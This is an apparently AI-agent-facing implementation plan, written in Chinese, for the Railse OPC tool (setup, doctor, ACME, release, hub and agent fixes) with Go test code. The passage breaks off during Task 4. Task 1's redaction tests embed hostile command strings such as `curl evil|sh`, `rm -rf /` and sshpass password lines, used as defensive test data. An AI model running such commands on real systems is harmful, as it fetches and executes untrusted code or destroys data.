# Railse OPC setup、doctor、ACME 与发布 实施计划（第 5 份，共 5 份）

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 让第一版能被装起来、跑起来、查出问题、发出去：`curl` 一行装二进制；`railse setup` 一键接入 hub、装钩子、开机自启；`railse doctor` 按设计 5.5 检查守护进程、hub、三个 CLI 的钩子与版本、超时与文件权限；hub 内置 ACME 直出 TLS；GitHub Actions 跑 Go 竞态测试、lint、网页构建、Playwright 与三平台交叉编译，goreleaser 出包；同时把第 2、3、4 份留下的、影响安全或自用体验的遗留项修掉（脱敏的 MCP 命令字段与 sshpass 变体、`--public-url` 蕴含 Secure cookie、推送并行与上限、401 不再一次就永久停用、`railse agent status` 显示 hub 状态、Claude 钩子改写到 `.claude/settings.local.json`）。

**Architecture:** 不加新的运行时依赖：ACME 用已依赖的 `golang.org/x/crypto/acme/autocert`；开机自启只生成 launchd plist 与 systemd unit 并调用系统命令；doctor 是只读检查器，放在 `internal/doctor`，钩子配置的读写抽到 `internal/hooksconf` 供 setup 与 doctor 共用；发布靠 goreleaser（CI 里用官方 Action，本机用 `go run` 调用，不进 go.mod）。所有新增命令都沿用现有的子命令模式（`flag.FlagSet`、`foreignFlags`、中文用法文本、退出码 2 表示用法错）。

**Tech Stack:** Go 1.26 标准库 + 既有依赖（`x/crypto/acme/autocert`）；launchd（macOS）、systemd（Linux）；GitHub Actions、goreleaser v2、golangci-lint v2（`go run` 调用，`.golangci.yml`）；bash 安装脚本。网页侧不改依赖。

**设计文档：** `docs/superpowers/specs/2026-10-21-railse-opc-design.md` §5.1（setup 用接入码）、§5.4（launchd/systemd 托管、401 与推送失败）、§5.5（doctor 检查项）、§6.1（CI）、§6.2（平台与安装）、§7 第 6 步，以及 §0.6 里“待改：Claude 钩子改写到 `.claude/settings.local.json`”。**前置：** 第 1 到 4 份已合并到 main（f97f1a9 之后），`make test` 与 `make e2e` 全过。遗留项来源：第 3 份终审（`任何 401 永久停用`、`直出 TLS 时须设 ReadTimeout`、`enroll_tokens 不清理`）、第 4 份终审（脱敏的 MCP shell 命令字段与 `"sshpass" -p` 等变体、`--public-url` 蕴含 Secure、推送并行与订阅上限、问题列表过滤已吊销机器、CI 里 e2e 的超时与崩溃可见性、`go.mod` 忽略 `web/node_modules`、VAPID 损坏时的诊断）。

**后续：** 本计划之后进入设计 §7 第 7 步：作者自用一周，对照 §6.4 验收；iPhone 真机检查结果决定是否加 Bark 渠道。

## Global Constraints

- 模块路径 `github.com/railse/railse-opc`，`go 1.26.0`。Go 侧不新增 `require`；工具链（golangci-lint、goreleaser）只经 `go run <模块>@<版本>` 或 GitHub Action 使用，不进 go.mod。网页侧不改依赖。
- 平台：macOS arm64、Linux amd64、Linux arm64（设计 6.2）；`CGO_ENABLED=0`（modernc sqlite 纯 Go）。开机自启：macOS 用 launchd 用户代理，Linux 用 systemd（用户单元；hub 以 root 安装时用系统单元：只配 `--hub`，默认数据目录 `/var/lib/railse-hub`，单元加 `StateDirectory=railse-hub`、`StateDirectoryMode=0700`，显式 `--dir` 优先；hub 永远不以 root 运行，绑定 443/80 靠 `AmbientCapabilities=CAP_NET_BIND_SERVICE`，`hub run` 发现 euid 为 0 时警告但不拒绝）。Windows 不做。
- 新增子命令沿用现有写法：`flag.FlagSet` 加 `foreignFlags` 拒绝不认的标志、`fs.NArg() != 0` 报多余参数、用法错退出 2、运行错退出 1、全部文案中文。写文件一律原子写（临时文件加 rename），私密文件 0600、目录 0700。
- doctor 只读：不改任何配置、不启动守护进程或服务、不连 CLI 的账号（允许带 10 秒超时跑 `claude|codex|gemini --version`）；每项检查有 `ok`/`warn`/`fail`/`skip` 四种结果与一句修复提示；任一 `fail` 退出码 1。
- ACME：只支持 Let's Encrypt 生产目录（autocert 默认），账户与证书私钥明文存在 hub 数据目录 `acme/`（0700，文件 0600，设计 5.3 的出站与签名密钥例外）；直出 TLS 时 `http.Server` 设 `ReadTimeout`。
- 每个 Task 结束时 `make test` 全过（gofmt、vet、`go test ./... -race`、网页检查）；改了 CI 或发布配置的 Task 还要本地校验 YAML 能解析（`ruby -ryaml -e 'YAML.load_file(ARGV[0])' 文件`，macOS 自带 ruby）与 goreleaser 配置能通过 `check`。测试里的目录用 `os.MkdirTemp("", "rs")`。提交信息用中文。
- 发布产物：`railse_<version>_<os>_<arch>.tar.gz`（内含 `railse`、`LICENSE`、`README.md`、`docs/*.md`，离线可读）与 `checksums.txt`；版本号来自 git tag `vX.Y.Z`，经 `-X main.version` 注入。GitHub 仓库 `railse/railse-opc`（与模块路径一致；安装脚本可用 `RAILSE_REPO` 改，goreleaser 的 owner/name 待用户确认 GitHub 账号后定）。
- 许可证 Apache 2.0（`LICENSE` 已在仓库首个提交里，Task 10 只核对首行，不再下载）。
- golangci-lint：`errcheck` 只对 `_test.go` 排除，非测试代码逐条修，不放宽其他配置（2026-10-25 预检决定）。

---

## 文件结构

| 文件 | 职责 |
|---|---|
| `internal/redact/redact.go`（改）、`shell.go`（改）、`redact_test.go`（改） | MCP 参数里 shell 命令字段按命令行语境脱敏；`sshpass`、`SSHPASS` 变体；裸值在 `\f`、单独 `\r` 处停 |
| `internal/hub/server.go`（改）、`auth.go`（改）、`api.go`（改）、`pushsvc.go`（改）、`api_push.go`（改）、`store/requests.go`（改） | `--public-url` 蕴含 Secure；`ReadTimeout`；`GET /api/version`；推送并行与订阅上限；问题列表过滤已吊销机器 |
| `internal/agent/hubclient.go`（改）、`server.go`（改）、`internal/proto/proto.go`（改）、`cmd/railse/agent.go`（改） | 连续 3 次 401 才停用；`Status.Hub`；`railse agent status` 显示 hub 状态 |
| `internal/hooksconf/hooksconf.go`、`hooksconf_test.go` | 三个 CLI 钩子配置的生成、合并、识别与检查（从 `cmd/railse/setup.go` 抽出，setup 与 doctor 共用） |
| `cmd/railse/setup.go`（改）、`setup_test.go`（改） | Claude 钩子写 `.claude/settings.local.json` 并从 `settings.json` 迁走；`setup autostart`；`setup all` |
| `cmd/railse/autostart.go`、`autostart_test.go` | launchd plist 与 systemd unit 的生成、安装、卸载、状态 |
| `internal/doctor/doctor.go`、`agent.go`、`hooks.go`、`cli.go`、`hub.go`、`report.go`、`*_test.go` | 检查项与报告 |
| `cmd/railse/doctor.go`、`doctor_test.go` | `railse doctor [--project] [--dir] [--hub-dir] [--json]` |
| `internal/hub/acme.go`、`acme_test.go`、`cmd/railse/hub.go`（改） | autocert 接线、80 端口挑战与跳转、`--acme-domain`、`--acme-email`、`--acme-http` |
| `LICENSE`、`README.md`、`.golangci.yml`、`go.mod`（改）、`Makefile`（改） | 许可证、说明、lint 配置、忽略 `web/node_modules`、`lint`/`release-check` 目标 |
| `.github/workflows/ci.yml`、`web/e2e/global-setup.ts`（改）、`web/playwright.config.ts`（改） | CI；e2e 超时与崩溃可见性 |
| `.goreleaser.yaml`、`.github/workflows/release.yml`、`install.sh`、`scripts/test-install.sh` | 出包、发布、一行安装与它的本地测试 |
| `scripts/smoke-claude-hub.sh` | 真实 Claude Code 经 hub 审批的冒烟 |
| `docs/setup.md`、`docs/hub.md`（改）、`docs/agent-local-loop.md`（改）、设计文档 §0.6、§1.3（改） | 文档 |

---

### Task 1: 脱敏遗留：MCP 参数里的 shell 命令字段、sshpass 变体、`\f` 与单独 `\r`

**Files:**
- Modify: `internal/redact/redact.go`（`walk`）
- Modify: `internal/redact/shell.go`（`sshpass` 识别、裸值停止字符）
- Modify: `internal/redact/redact_test.go`

**Interfaces:**
- 导出接口不变（`String`、`Text`、`Payload`）。
- `walk` 的行为变化：MCP 参数（合法 JSON）里键名匹配 `(?i)^(command|cmd|script|shell_command|bash|sh)$` 的字符串值按命令行语境处理（`String`）；该键的值是字符串数组时每个元素都按命令行语境处理；该键的值是 shell 解释器（`sh`、`bash`、`zsh`、`dash`、`ksh`，可带路径）时，同一对象里 `args`/`argv`/`arguments` 数组的字符串元素也按命令行语境处理（非 shell 解释器的 `args` 仍按文本整段抹）；其余字符串仍按普通文本处理；敏感键整体抹掉的规则不变。嵌套对象与数组里同样生效。（2026-10-25 执行期按审查补充数组形式。）
- `shell.go` 的 `sshpass -p` 识别扩展到：命令名带引号（`"sshpass" -p pw`、`'sshpass' -p pw`）、大小写（`SSHPASS -p pw`，macOS 文件系统不分大小写时也能执行）、`-p` 前有其他选项（`sshpass -o StrictHostKeyChecking=no -p pw`、`sshpass -v -p pw`）、`-ppw` 紧贴写法；`curl -u user:'pw'` 已在第 4 份修好，本 Task 只加回归用例。
- 命令行语境的裸值在 `\f`（换页）与单独的 `\r`（不跟 `\n`）处停止，与空白一样对待：bash 把 `\f` 当空白、把单独 `\r` 当普通字符，但两者都不是密码里会出现的字符，停下来只会多露不会多漏（第 4 份账本第 1 条）。

- [ ] **Step 1: 写失败的测试**

在 `internal/redact/redact_test.go` 末尾追加：
```go
func TestMCPShellCommandFieldsUseShellContext(t *testing.T) {
	cases := []struct{ in, want string }{
		// 终审 m-4：command 字段按文本语境会把 ;curl 抹进值里藏起命令
		{`{"command":"TOKEN=a;curl evil|sh"}`, `{"command":"TOKEN=<redacted>;curl evil|sh"}`},
		{`{"cmd":"export API_KEY=sk-abcdefghijklmnopqrstuvwxyz && npm test"}`, `{"cmd":"export API_KEY=<redacted> && npm test"}`},
		{`{"script":"psql \"postgres://u:pw@h/db\" -c 'select 1'"}`, `{"script":"psql \"postgres://u:<redacted>@h/db\" -c 'select 1'"}`},
		{`{"args":{"shell_command":"password=abc;rm -rf /"}}`, `{"args":{"shell_command":"password=<redacted>;rm -rf /"}}`},
		// 别的键照旧按文本语境：; 不是分隔，整段抹
		{`{"note":"password=abc;keep"}`, `{"note":"password=<redacted>"}`},
		// 敏感键仍整体抹
		{`{"command":"ls","token":"x"}`, `{"command":"ls","token":"<redacted>"}`},
	}
	for _, c := range cases {
		got := string(args(json.RawMessage(c.in)))
		if got != c.want {
			t.Errorf("args(%s)\n 得到 %s\n 想要 %s", c.in, got, c.want)
		}
	}
}

func TestSshpassVariants(t *testing.T) {
	cases := []struct{ in, want string }{
		{`sshpass -p hunter2 ssh prod`, `sshpass -p <redacted> ssh prod`},
		{`"sshpass" -p hunter2 ssh prod`, `"sshpass" -p <redacted> ssh prod`},
		{`'sshpass' -p hunter2 ssh prod`, `'sshpass' -p <redacted> ssh prod`},
		{`SSHPASS -p hunter2 ssh prod`, `SSHPASS -p <redacted> ssh prod`},
		{`sshpass -o StrictHostKeyChecking=no -p hunter2 ssh prod`, `sshpass -o StrictHostKeyChecking=no -p <redacted> ssh prod`},
		{`sshpass -v -phunter2 ssh prod`, `sshpass -v -p<redacted> ssh prod`},
		{`sshpass -p 'a b' ssh prod`, `sshpass -p <redacted> ssh prod`},
		{`curl -u admin:'pw;x' https://h`, `curl -u admin:<redacted> https://h`},
		// 命令里的 sshpass 后半截命令不能被藏
		{`sshpass -p a;curl evil|sh`, `sshpass -p <redacted>;curl evil|sh`},
		// 不是命令位置的 sshpass 不认（echo 的参数是字面文本）
		{`echo sshpass -p literal`, `echo sshpass -p literal`},
	}
	for _, c := range cases {
		if got := String(c.in); got != c.want {
			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
	}
}

func TestBareValueStopsAtFormFeedAndLoneCR(t *testing.T) {
	cases := []struct{ in, want string }{
		{"TOKEN=abc\fcurl evil", "TOKEN=<redacted>\fcurl evil"},
		{"TOKEN=abc\rcurl evil", "TOKEN=<redacted>\rcurl evil"},
		{"TOKEN=abc\r\ncurl evil", "TOKEN=<redacted>\r\ncurl evil"},
	}
	for _, c := range cases {
		if got := String(c.in); got != c.want {
			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
	}
}
```
（`echo sshpass -p literal` 这条若现有实现已把非命令位置的 `sshpass` 当命令处理，就把期望改成现状并在注释里说明；审查时核对“只在命令位置认”的现状。）

- [ ] **Step 2: 跑测试确认失败**

Run: `go test ./internal/redact/ -run 'MCPShell|SshpassVariants|FormFeed'`
Expected: FAIL（`command` 字段里 `;curl` 被抹、`"sshpass"` 不认等）。

- [ ] **Step 3: 写实现**

`internal/redact/redact.go` 的 `walk`：
```go
// shellValueKey 是 MCP 参数里装 shell 命令的键名：这些值是会被执行的命令，按命令行语境脱敏，
// 让裸值在 shell 元字符处停下，后半截命令露出来（第 4 份终审 m-4）。
var shellValueKey = regexp.MustCompile(`(?i)^(command|cmd|script|shell_command|bash|sh)$`)

// walk 递归处理 JSON 值：敏感键的值整体抹掉，装命令的键按命令行语境，其余字符串按普通文本逐个脱敏。
func walk(v any) any {
	switch x := v.(type) {
	case map[string]any:
		for k, e := range x {
			switch {
			case sensitiveKey.MatchString(k):
				x[k] = placeholder
			default:
				if s, ok := e.(string); ok && shellValueKey.MatchString(k) {
					x[k] = String(s)
				} else {
					x[k] = walk(e)
				}
			}
		}
	case []any:
		for i, e := range x {
			x[i] = walk(e)
		}
	case string:
		return redact(x, textRules)
	}
	return v
}
```

`internal/redact/shell.go`：
- 认 `sshpass` 命令名的地方（第 4 份实现里按命令位置匹配命令名的函数）改为：去掉包裹命令名的单双引号后按不区分大小写比较 `sshpass`；`-p` 的匹配允许在命令名与 `-p` 之间有任意个其他选项（以 `-` 开头的词及其参数，`-o` 带一个参数），并接受 `-p值` 紧贴写法。具体改动点以现有代码结构为准：若 `sshpass`、`curl -u`、`mysql -p` 的“同一条命令”规则是 `viewRules` 里的正则，就把 `sshpass` 那条的前缀从 `\bsshpass\b` 改为 `(?i)(?:^|[\s;|&(])['"]?sshpass['"]?` 并在命令名与 `-p` 之间允许 `(?:\s+-[a-zA-Z]+(?:\s+\S+)?)*`；`-p` 后允许无空白直接接值。
- 裸值字符类排除 `\f` 与 `\r`（视图层把它们映射为与空白相同的字节即可）。

- [ ] **Step 4: 跑测试并做差分核对**

Run: `go test ./internal/redact/ -race -count=1 && go test ./internal/redact/ -run Diff -count=1`
Expected: 全部 PASS（第 4 份加的 bash 差分模糊测试若按名字 `Diff`/`Fuzz` 存在，一并跑过；没有则跳过第二条）。

- [ ] **Step 5: 提交**

```bash
git add internal/redact/
git commit -m "fix(redact): MCP 参数里的命令字段按命令行语境脱敏，认 sshpass 的引号、大小写与选项变体，裸值在换页与单独回车处停"
```

---

### Task 2: hub 遗留：`--public-url` 蕴含 Secure、ReadTimeout、`/api/version`、推送并行与上限、问题列表过滤已吊销机器

**Files:**
- Modify: `internal/hub/server.go`（`Config.Version`；`ReadTimeout`；`/api/version` 路由）
- Modify: `internal/hub/auth.go`（Secure 判断）
- Modify: `internal/hub/pushsvc.go`（并行发送）
- Modify: `internal/hub/api_push.go`（订阅上限）
- Modify: `internal/hub/store/requests.go`（`OpenQuestions` 过滤已吊销机器）
- Modify: `internal/hub/api_test.go`、`pushsvc_test.go`、`store/requests_test.go`
- Modify: `cmd/railse/hub.go`（注入 `Version`）
- Modify: `docs/hub.md`

**Interfaces:**
- `Config.Version string`（cmd 注入 `main.version`；空显示 `dev`）
- `GET /api/version`（无需登录）→ `{"version":"…","agent_proto":1}`；`agent_proto` 取 `wire.Proto`
- cookie `Secure` = `cfg.SecureCookies || cfg.PublicURL 以 https:// 开头 || r.TLS != nil`
- `http.Server.ReadTimeout = 30 * time.Second`（WebSocket 握手完成后由 Hijack 清掉期限，不影响长连接）
- 推送：`pushWorkers = 4`，一条请求对多个订阅并行发送，结果仍按原规则维护订阅；`maxPushSubscriptions = 20`，超过时 `POST /api/push/subscribe` 回 409 `{"error":"推送订阅已达上限 20 个，请先在别的设备上关闭通知"}`（同一端点重新订阅不算新增）
- `OpenQuestions` 不列 `machines.revoked = 1` 的机器的问题

- [ ] **Step 1: 写失败的测试**

`internal/hub/api_test.go` 追加：
```go
func TestVersionEndpointAndSecureCookieFromPublicURL(t *testing.T) {
	h := newTestHubWith(t, func(c *Config) { c.PublicURL = "https://hub.example.com"; c.Version = "1.2.3" }, nil)
	var v map[string]any
	decodeBody(t, doReq(t, "GET", h.http.URL+"/api/version", nil, "", nil), &v)
	if v["version"] != "1.2.3" || v["agent_proto"] != float64(wire.Proto) {
		t.Fatalf("version = %v", v)
	}
	h.srv.SetPassword("hunter22")
	resp := postJSON(t, h.http.URL+"/api/login", map[string]string{"password": "hunter22"}, nil)
	var secure bool
	for _, c := range resp.Cookies() {
		if c.Name == "railse_session" {
			secure = c.Secure
		}
	}
	if !secure {
		t.Fatal("配了 https 的 --public-url 时 cookie 应带 Secure")
	}
}

func TestPushSubscriptionCap(t *testing.T) {
	f := newFakePushEndpoint(t)
	h, ck := pushHub(t, f)
	for i := 0; i < maxPushSubscriptions; i++ {
		body, _ := subscribeBody(t, fmt.Sprintf("%s/p/%d", f.srv.URL, i))
		if resp := doReq(t, "POST", h.http.URL+"/api/push/subscribe", body, "application/json", ck); resp.StatusCode != http.StatusNoContent {
			t.Fatalf("第 %d 个订阅: %d", i, resp.StatusCode)
		}
	}
	body, _ := subscribeBody(t, f.srv.URL+"/p/overflow")
	if resp := doReq(t, "POST", h.http.URL+"/api/push/subscribe", body, "application/json", ck); resp.StatusCode != http.StatusConflict {
		t.Fatalf("超过上限应 409: %d", resp.StatusCode)
	}
	// 已有端点重新订阅不算新增
	again, _ := subscribeBody(t, f.srv.URL+"/p/0")
	if resp := doReq(t, "POST", h.http.URL+"/api/push/subscribe", again, "application/json", ck); resp.StatusCode != http.StatusNoContent {
		t.Fatalf("重新订阅已有端点: %d", resp.StatusCode)
	}
}
```
（`fmt` 若未导入则加。）

`internal/hub/pushsvc_test.go` 追加：
```go
func TestPushDeliversInParallel(t *testing.T) {
	// 假端点每次慢 300ms；8 个订阅并行 4 路应在 1 秒内发完，串行要 2.4 秒
	f := newFakePushEndpoint(t)
	f.delay.Store(int64(300 * time.Millisecond))
	h, ck := pushHub(t, f)
	for i := 0; i < 8; i++ {
		body, _ := subscribeBody(t, fmt.Sprintf("%s/p/%d", f.srv.URL, i))
		doReq(t, "POST", h.http.URL+"/api/push/subscribe", body, "application/json", ck)
	}
	id, secret := enrollMachine(t, h, "mac")
	c := dialAgent(t, h, secret, wire.Hello{MachineID: id, Proto: wire.Proto, HomeDir: "/home/u"})
	defer c.close()
	start := time.Now()
	c.send(pendingFrame("r1", "s1", "t1", "git push origin main"))
	waitFor(t, "8 条推送都到", func() bool { return f.count() == 8 })
	if d := time.Since(start); d > 1500*time.Millisecond {
		t.Fatalf("8 条推送用了 %s，没有并行", d)
	}
}
```
`fakePushEndpoint` 加 `delay atomic.Int64`，handler 开头 `time.Sleep(time.Duration(f.delay.Load()))`。

`internal/hub/store/requests_test.go` 的 `TestOpenQuestions` 末尾追加：
```go
	// 已吊销机器的问题不列
	m2, _ := s.CreateMachine("old", "secret-2", "/home/o")
	s3, _ := s.UpsertSession(m2.ID, proto.Session{Tool: "claude", CLISessionID: "s3", Cwd: "/p"}, "p")
	if err := s.InsertRequest(Request{ID: "q9", MachineID: m2.ID, SessionID: s3, Kind: "question", State: "recorded", Payload: policy.Payload{Type: policy.PayloadShell, Command: "x"}, CreatedAt: at(6)}); err != nil {
		t.Fatal(err)
	}
	s.RevokeMachine(m2.ID)
	got, _ = s.OpenQuestions(time.Date(2026, 10, 23, 10, 0, 1, 0, time.UTC), 10)
	for _, r := range got {
		if r.ID == "q9" {
			t.Fatal("已吊销机器的问题不应列出")
		}
	}
```

- [ ] **Step 2: 跑测试确认失败**

Run: `go test ./internal/hub/... -run 'VersionEndpoint|SubscriptionCap|Parallel|OpenQuestions'`
Expected: FAIL（`/api/version` 404、cookie 无 Secure、第 21 个订阅 204、推送串行、q9 被列出）。

- [ ] **Step 3: 写实现**

`internal/hub/server.go`：
- `Config` 加 `Version string`。
- `routes()` 加 `s.mux.HandleFunc("GET /api/version", s.handleVersion)`：
```go
// handleVersion 无需登录：doctor 与安装脚本用它确认 hub 可达、版本与守护进程协议号。
func (s *Server) handleVersion(w http.ResponseWriter, r *http.Request) {
	v := s.cfg.Version
	if v == "" {
		v = "dev"
	}
	writeJSON(w, http.StatusOK, map[string]any{"version": v, "agent_proto": wire.Proto})
}
```
- `serve` 里的 `http.Server` 加 `ReadTimeout: 30 * time.Second`（注释：直出 TLS 时没有反向代理缓冲慢速请求；WebSocket 在 Hijack 时期限被清掉）。

`internal/hub/auth.go` 的 `sessionCookie`：`Secure: s.cfg.SecureCookies || strings.HasPrefix(s.cfg.PublicURL, "https://") || r.TLS != nil`。

`internal/hub/pushsvc.go` 的 `deliver`：
```go
const pushWorkers = 4

	type result struct{ r pushResult }
	results := make(chan pushResult, len(subs))
	jobs := make(chan store.PushSubscription)
	var wg sync.WaitGroup
	for i := 0; i < min(pushWorkers, len(subs)); i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for sub := range jobs {
				results <- p.sendOne(ctx, sub, msg, opts)
			}
		}()
	}
	for _, sub := range subs {
		jobs <- sub
	}
	close(jobs)
	wg.Wait()
	close(results)
	var sent, gone, failed int
	for res := range results {
		switch res {
		case pushOK:
			sent++
		case pushGone:
			gone++
		default:
			failed++
		}
	}
```
（`opts` 是原来逐条发送时构造的 `push.Options`；去掉未用的 `result` 类型。`removeSubscription`、`MarkPushFailure` 等已是按端点的独立数据库操作，并行安全。）

`internal/hub/api_push.go` 的 `handlePushSubscribe`：解析通过后、入库前：
```go
	if _, err := s.store.GetPushSubscription(body.Endpoint); errors.Is(err, store.ErrNotFound) {
		n, err := s.store.CountPushSubscriptions()
		if err != nil {
			s.internalErr(w, "统计推送订阅", err)
			return
		}
		if n >= maxPushSubscriptions {
			writeErr(w, http.StatusConflict, fmt.Sprintf("推送订阅已达上限 %d 个，请先在别的设备上关闭通知", maxPushSubscriptions))
			return
		}
	}
```
`const maxPushSubscriptions = 20`。

`internal/hub/store/requests.go` 的 `OpenQuestions`：`WHERE` 里加 `AND NOT EXISTS (SELECT 1 FROM machines m WHERE m.id = q.machine_id AND m.revoked = 1)`。

`cmd/railse/hub.go`：构造 `cfg` 后 `cfg.Version = version`。

`docs/hub.md`：API 表加 `GET /api/version`（无需登录）；“安全要点”里 cookie 一条加“配了 https 的 `--public-url` 时自动加 Secure”；推送一节加订阅上限 20 与并行发送。

- [ ] **Step 4: 跑测试确认通过**

Run: `make test`
Expected: 全过。

- [ ] **Step 5: 提交**

```bash
git add internal/hub cmd/railse/hub.go docs/hub.md
git commit -m "feat(hub): /api/version；https 的 public-url 蕴含 Secure cookie；ReadTimeout；推送并行与订阅上限；问题列表不含已吊销机器"
```

---

### Task 3: 守护进程遗留：连续 3 次 401 才停用、`railse agent status` 显示 hub 状态

**Files:**
- Modify: `internal/agent/hubclient.go`
- Modify: `internal/agent/server.go`（`SetHubStatus`、`status()`）
- Modify: `internal/proto/proto.go`（`Status.Hub`、`Status.HubURL`）
- Modify: `cmd/railse/agent.go`（接线与打印）
- Modify: `internal/agent/hubclient_test.go`、`cmd/railse/agent_test.go`

**Interfaces:**
- `proto.Status` 加 `Hub string \`json:"hub"\``（取值 `none`、`connecting`、`connected`、`disabled`）与 `HubURL string \`json:"hub_url,omitempty"\``
- `func (s *Server) SetHubStatus(fn func() (state, url string))`；没设时 `status().Hub = "none"`
- `HubClient`：握手 401 时不再立即停用；连续 3 次 401（中间没有成功握手）才 `disable`，前两次按正常退避重连并记日志“hub 回 401（第 N/3 次）”；`func (h *HubClient) State() string`（`connecting`、`connected`、`disabled`）
- `railse agent status` 输出加一行 `hub: none` / `hub: connected https://…` / `hub: connecting https://…` / `hub: disabled https://…（本机密钥被拒，请 railse agent enroll --force 后重启）`

- [ ] **Step 1: 写失败的测试**

`internal/agent/hubclient_test.go` 追加：
```go
func TestHubClientDisablesOnlyAfterThree401(t *testing.T) {
	h := startHub(t)
	m := enroll(t, h)
	// 吊销后握手一律 401
	if err := h.st.RevokeMachine(m.MachineID); err != nil {
		t.Fatal(err)
	}
	env := newClientWithBackoff(t, h, m, []time.Duration{50 * time.Millisecond})
	deadline := time.Now().Add(5 * time.Second)
	for !env.c.Disabled() && time.Now().Before(deadline) {
		time.Sleep(20 * time.Millisecond)
	}
	if !env.c.Disabled() {
		t.Fatal("连续 3 次 401 后应停用")
	}
	if n := countLog(env.logs, "401"); n < 3 {
		t.Fatalf("应记 3 次 401 日志，得到 %d", n)
	}
	if env.c.State() != "disabled" {
		t.Fatalf("State = %s", env.c.State())
	}
}
```
（`newClientWithBackoff` 与 `countLog` 是在本文件新加的辅助：前者同 `newClient` 但把退避序列换成传入的值，`HubClient` 为此需要一个只在测试里设置的 `backoff []time.Duration` 字段或构造选项；后者数日志缓冲里含某子串的行数，日志缓冲用 `bytes.Buffer` 加锁的 `logger`。若第 4 份已有类似辅助就复用。）

`cmd/railse/agent_test.go` 的 `TestAgentServeAndControl` 里 `status` 断言加 `!strings.Contains(out.String(), "hub: none")` 时失败；`TestEndToEndHubApproval`（`cmd/railse/e2e_hub_test.go`）在守护进程连上 hub 后追加：
```go
	var out, errOut bytes.Buffer
	run([]string{"agent", "status", "--dir", cfgDir}, &out, &errOut)
	if !strings.Contains(out.String(), "hub: connected "+h.http.URL) {
		t.Fatalf("status 应显示已连上 hub: %q", out.String())
	}
```

- [ ] **Step 2: 跑测试确认失败**

Run: `go test ./internal/agent/ -run DisablesOnlyAfterThree; go test ./cmd/railse/ -run 'AgentServeAndControl|EndToEndHubApproval'`
Expected: FAIL（第一次 401 就停用；status 没有 hub 行）。

- [ ] **Step 3: 写实现**

`internal/proto/proto.go` 的 `Status` 加：
```go
	Hub    string `json:"hub"`               // none、connecting、connected、disabled
	HubURL string `json:"hub_url,omitempty"`
```

`internal/agent/server.go`：
- `Server` 加 `hubStatus func() (state, url string)`；`func (s *Server) SetHubStatus(fn func() (state, url string)) { s.hubStatus = fn }`（Listen 前调用）。
- `status()` 里：`hub, url := "none", ""; if s.hubStatus != nil { hub, url = s.hubStatus() }`，填进 `Status`。

`internal/agent/hubclient.go`：
- 字段 `unauthorizedRuns int`（连续 401 次数）；`Run` 的循环里：握手回 401 时 `unauthorizedRuns++`，`< 3` 时记日志 `hub %s 回 HTTP 401（第 %d/3 次），稍后重试；若持续，本机可能已被吊销或 machine.json 里的密钥无效` 并按正常退避；`>= 3` 时走原来的 `disable` 与醒目日志。成功收到 welcome 时 `unauthorizedRuns = 0`。
- `func (h *HubClient) State() string`：`disabled` > `connected` > `connecting`。
- 测试用退避：`backoff` 从包级变量改为 `HubClient` 字段，`NewHubClient` 里赋默认值；`internal/agent/testing.go` 加 `func (h *HubClient) SetBackoffForTest(b []time.Duration)`。

`cmd/railse/agent.go`：
- `runAgentServe` 接 hub 时 `srv.SetHubStatus(func() (string, string) { return client.State(), machine.HubURL })`（在 `Listen` 之前）。
- `status` 的打印加：
```go
	switch st.Hub {
	case "", "none":
		fmt.Fprintln(stdout, "hub: none")
	case "disabled":
		fmt.Fprintf(stdout, "hub: disabled %s（本机密钥被拒，请 railse agent enroll --force 后重启守护进程）\n", st.HubURL)
	default:
		fmt.Fprintf(stdout, "hub: %s %s\n", st.Hub, st.HubURL)
	}
```

`docs/hub.md` “接入后的行为”里把“hub 回 401 后守护进程停止重连”改为“连续 3 次握手 401 后停止重连（`railse agent status` 显示 `hub: disabled`）”；“故障排查”加 `hub:` 行的含义。

- [ ] **Step 4: 跑测试确认通过**

Run: `make test`
Expected: 全过。

- [ ] **Step 5: 提交**

```bash
git add internal/agent internal/proto cmd/railse/agent.go cmd/railse/agent_test.go cmd/railse/e2e_hub_test.go docs/hub.md
git commit -m "feat(agent): 连续三次 401 才停用 hub 连接；railse agent status 显示 hub 连接状态"
```

---

### Task 4: 钩子配置抽成 `internal/hooksconf`，Claude 钩子改写到 `.claude/settings.local.json` 并从 `settings.json` 迁走

**Files:**
- Create: `internal/hooksconf/hooksconf.go`、`internal/hooksconf/hooksconf_test.go`
- Modify: `cmd/railse/setup.go`（改用 `hooksconf`；Claude 目标路径；迁移）
- Modify: `cmd/railse/setup_test.go`
- Modify: `docs/agent-local-loop.md`、设计文档 §0.6（“待改”改为“已改”）

**Interfaces:**（包 `hooksconf`）
- `type Entry struct{ Name, Type, Command string; Timeout int }`、`type Group struct{ Matcher *string; Hooks []Entry }`（JSON 标签与 `cmd/railse/setup.go` 原来的 `hookEntry`、`hookGroup` 相同）
- `func Plan(cli, bin string) map[string][]Group`（原 `hookPlan`）
- `func Merge(existing []byte, bin string, entries map[string][]Group) ([]byte, error)`（原 `mergeHooks`；`entries` 为 nil 时只删我们的条目，`hooks` 删空后整个 `hooks` 键也删掉）
- `func IsOurs(entry any, bin string) bool`、`func CommandProgram(cmd string) (string, bool)`、`func ShellQuote(s string) string`（原 `isOurs`、`hookCommandProgram`、`shellQuote`）
- `type Installed struct{ Events map[string]EventState }`、`type EventState struct{ Present bool; Timeout int; Program string }`；`func Inspect(doc []byte, bin string) (Installed, error)`：读一份钩子配置，报告每个事件里是否有我们的条目（`bin` 为空时按“程序文件名是 railse”认）、它的 timeout 与程序路径；文档不是合法 JSON 返回错误
- `func Expected(cli string) map[string]int`：每个 CLI 必须有的事件与它的超时下限（Claude：`PermissionRequest` 86400，`Notification`、`Stop`、`SessionEnd` 0；Codex：`PermissionRequest` 86400，`Stop`、`SessionEnd` 0；Gemini：`BeforeTool` 86400000，`Notification`、`AfterAgent`、`SessionEnd` 0）
- `func ClaudePaths(project string) (local, shared string)`：`.claude/settings.local.json` 与 `.claude/settings.json`；`func GeminiPath(project string) string`；`func CodexPath(home string) string`
- `setup hooks` 的行为变化：Claude 写 `settings.local.json`；若 `settings.json` 里有我们的条目，用 `Merge(existing, bin, nil)` 删掉并写回（打印“已从 .claude/settings.json 迁走 Railse 钩子”）；`--dry-run` 同样打印两份

